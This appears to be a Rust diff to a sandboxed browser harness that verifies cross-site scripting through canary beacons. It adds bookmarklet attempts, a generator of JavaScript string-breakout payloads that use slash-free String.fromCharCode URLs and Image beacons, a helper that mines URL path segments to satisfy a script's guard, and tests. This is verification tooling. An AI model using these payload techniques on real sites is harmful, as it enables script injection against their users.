@@ -96,6 +96,120 @@ pub fn via_referrer(probe: &BrowserProbe) -> bool {
     probe.vector == UrlVector::Referrer
 }
 
+/// The page loads that drive a *bookmarklet* — a `javascript:`-prefixed script a victim runs on an
+/// attacker-chosen page, so there is no host HTML page that `<script src>`s it. The sandbox
+/// synthesizes a host at `/__jss/bm` that loads the bookmarklet body; the attacker-controlled URL
+/// the bookmarklet reads (`location.href`) is placed in the *fragment*, which — unlike a real page
+/// path — the harness can set to anything and which the browser keeps verbatim in `location.href`.
+///
+/// The canary cannot be the HTML `<img onerror>` markup other browser sinks use: the only bytes a
+/// browser leaves intact in `location.href` are the URL-safe ones (`"`, `<`, `>` and spaces are
+/// percent-encoded), and a bookmarklet typically slices the URL on `/`. So the payload instead
+/// breaks out of a quoted JS string in an inline event handler (the sink the value reaches) and
+/// beacons the marker through an image whose URL is assembled at runtime with no literal `/`.
+///
+/// Each mined URL path marker (`profile` from `location.href.match(/profile\/([^/?]+)/)`) is tried
+/// as the segment that precedes the payload, so the script's own URL guard matches; a bare payload
+/// is tried too. The returned `url`s are the driver's; the victim-facing reproduction URL is the
+/// fragment, recovered by the sandbox.
+pub fn bookmarklet_attempts(
+    script: &str,
+    source: &str,
+    canary: &Canary,
+    nonce: u32,
+) -> Vec<BrowserAttempt> {
+    let token = format!("{}-{nonce}", canary.token);
+    let payloads = js_string_breakout_canaries(canary, &token);
+    let markers = url_path_markers(source);
+    let s = encode(script);
+    let mut out = Vec::new();
+    let mut push = |url: String| {
+        out.push(BrowserAttempt {
+            url,
+            token: token.clone(),
+        })
+    };
+    for payload in &payloads {
+        for marker in &markers {
+            push(format!("/__jss/bm?s={s}#{marker}/{payload}"));
+        }
+        push(format!("/__jss/bm?s={s}#{payload}"));
+    }
+    out
+}
+
+/// Canaries that break out of a quoted JS string in an inline event handler and beacon the marker.
+/// One variant per quote style (`'`/`"`): close the string, call the beacon, reopen the string so
+/// the surrounding handler stays syntactically whole. The marker URL is concatenated from
+/// `String.fromCharCode(47)` so the payload itself never contains a `/` (which would terminate the
+/// single URL segment the bookmarklet captures) and the beacon rides an `Image` so the permissive
+/// `fetch` shim the harness installs never intercepts it. Only URL-safe characters are used, so the
+/// payload survives verbatim in `location.href`.
+fn js_string_breakout_canaries(canary: &Canary, token: &str) -> Vec<String> {
+    let host = canary.marker_host();
+    let scheme = canary.marker_scheme();
+    let url =
+        format!("'{scheme}:'+String.fromCharCode(47,47)+'{host}'+String.fromCharCode(47)+'{token}'");
+    let code = format!("(new(Image)).setAttribute('src',{url})");
+    vec![
+        format!("');{code};void('"),
+        format!("\");{code};void(\""),
+    ]
+}
+
+/// URL path markers a script matches against: an identifier immediately before an escaped slash in
+/// a regex (`profile` in `/profile\/([^/?]+)/`), or between literal slashes in a string
+/// (`/entries/`). Used to prefix a bookmarklet payload so the script's own URL guard matches before
+/// the tainted segment is reached. First-seen, deduplicated and bounded; nothing is tied to a
+/// particular app.
+fn url_path_markers(source: &str) -> Vec<String> {
+    let bytes = source.as_bytes();
+    let mut out: Vec<String> = Vec::new();
+    let mut push = |word: &str| {
+        if !word.is_empty()
+            && !word.bytes().all(|b| b.is_ascii_digit())
+            && !out.iter().any(|m| m == word)
+        {
+            out.push(word.to_owned());
+        }
+    };
+    for (i, &b) in bytes.iter().enumerate() {
+        if b != b'/' {
+            continue;
+        }
+        // `ident` directly before an escaped slash `\/` (a regex path segment).
+        if i > 0 && bytes.get(i - 1) == Some(&b'\\') {
+            let end = i - 1;
+            let start = source
+                .get(..end)
+                .and_then(|head| head.bytes().rposition(|b| !is_ident_byte(b)).map(|at| at + 1))
+                .unwrap_or(0);
+            if let Some(word) = source.get(start..end) {
+                push(word);
+            }
+        }
+        // `/ident/` between literal slashes (a string path segment).
+        let s = i + 1;
+        let end = bytes
+            .iter()
+            .skip(s)
+            .position(|b| !is_ident_byte(*b))
+            .map_or(bytes.len(), |rel| s + rel);
+        if end > s
+            && bytes.get(end) == Some(&b'/')
+            && let Some(word) = source.get(s..end)
+        {
+            push(word);
+        }
+    }
+    out.truncate(8);
+    out
+}
+
+fn is_ident_byte(b: u8) -> bool {
+    b.is_ascii_alphanumeric() || b == b'_'
+}
+
 /// The payload to carry on a referrer-sourced load, and the token it signals with.
 pub fn referrer_payload(probe: &BrowserProbe, canary: &Canary, nonce: u32) -> (String, String) {
     let token = format!("{}-{nonce}", canary.token);
@@ -246,6 +360,59 @@ mod tests {
         let canary = Canary::new("t".to_owned());
         let payload = canary_payload(BrowserSink::Import, &canary, "t-1");
         assert_eq!(payload, canary.service_url_for_token("t-1"));
+    }
+
+    #[test]
+    fn a_bookmarklet_payload_breaks_out_of_a_quoted_handler_without_a_slash_or_markup() {
+        let canary =
+            Canary::new("tok".to_owned()).with_marker_host(Some("0x7f000001:4321".to_owned()));
+        let payloads = js_string_breakout_canaries(&canary, "tok-1");
+        assert_eq!(payloads.len(), 2);
+        for payload in &payloads {
+            // URL serialization keeps none of these, so the canary must avoid them entirely.
+            assert!(!payload.contains('/'), "{payload}");
+            assert!(!payload.contains('?'), "{payload}");
+            assert!(!payload.contains('<') && !payload.contains('>'), "{payload}");
+            assert!(!payload.contains(' '), "{payload}");
+            // It beacons the marker for this token through an image the fetch shim cannot swallow.
+            assert!(payload.contains("Image"), "{payload}");
+            assert!(payload.contains("0x7f000001:4321"), "{payload}");
+            assert!(payload.contains("tok-1"), "{payload}");
+            // The marker path separators are assembled at runtime, never written literally.
+            assert!(payload.contains("String.fromCharCode(47"), "{payload}");
+        }
+        // One variant per quote style, so either single- or double-quoted handler strings break out.
+        assert!(payloads[0].starts_with("');"));
+        assert!(payloads[1].starts_with("\");"));
+    }
+
+    #[test]
+    fn url_path_markers_mines_a_regex_and_string_path_segment() {
+        let source = "let m = location.href.match(/profile\\/([^/?]+)/); fetch('/entries/'+id);";
+        let markers = url_path_markers(source);
+        assert!(markers.iter().any(|m| m == "profile"), "{markers:?}");
+        assert!(markers.iter().any(|m| m == "entries"), "{markers:?}");
+    }
+
+    #[test]
+    fn bookmarklet_attempts_place_the_payload_after_a_mined_marker_in_the_fragment() {
+        let canary = Canary::new("t".to_owned());
+        let source = "var u = window.location.href.match(/profile\\/([^/?]+)/);";
+        let attempts = bookmarklet_attempts("bm.js", source, &canary, 2);
+        assert!(!attempts.is_empty());
+        // Every attempt drives the synthesized bookmarklet host for this script, via the fragment.
+        assert!(attempts.iter().all(|a| a.url.starts_with("/__jss/bm?s=bm.js#")));
+        assert!(attempts.iter().all(|a| a.token == "t-2"));
+        // The mined `profile/` marker precedes the payload so the script's URL guard matches.
+        assert!(
+            attempts.iter().any(|a| a.url.contains("#profile/")),
+            "{attempts:?}"
+        );
+        // A bare payload (no marker) is tried too, for scripts with no path guard.
+        assert!(
+            attempts.iter().any(|a| a.url.contains("#')")),
+            "{attempts:?}"
+        );
     }
 
     #[test]
